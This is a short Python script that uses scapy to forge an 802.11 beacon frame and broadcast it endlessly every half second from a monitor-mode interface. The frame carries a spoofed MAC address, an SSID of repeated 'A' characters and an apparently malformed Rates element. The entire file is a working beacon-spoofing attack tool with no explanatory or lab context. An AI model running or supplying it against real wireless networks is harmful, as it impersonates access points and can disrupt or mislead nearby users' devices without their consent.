#!/usr/bin/env python

from scapy.all import *
beacon=RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2="00:01:02:03:04:05",addr3="00:01:02:03:04:05")/Dot11Beacon(cap="ESS")/Dot11Elt(ID="SSID", len=12,info="AAAAAAAAAAAA")/Dot11Elt(ID="Rates",info='\x00\x00\x00\x00')/Dot11Elt(ID="DSset",info="\x03")/Dot11Elt(ID="TIM",info="\x00\x01\x00\x00")
conf.iface="wlan1mon"
sendp(beacon,inter=0.5,loop=1)
